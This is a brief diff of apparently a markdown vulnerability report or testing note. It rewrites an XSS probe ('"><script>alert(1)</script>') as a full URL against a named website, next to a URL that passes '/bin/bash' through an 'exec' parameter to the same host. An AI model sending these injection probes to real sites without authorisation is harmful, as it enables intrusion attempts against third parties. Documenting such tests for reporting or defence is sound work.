@@ -23,7 +23,7 @@
 
 > http://cadastro.laurodepaula.com.br/?exec=/bin/bash
 
-> cadastro.laurodepaula.com.br/?q="><script>alert(1)</script>"
+> http://cadastro.laurodepaula.com.br/?q="><script>alert(1)</script>"
 
 
 #### Log verify
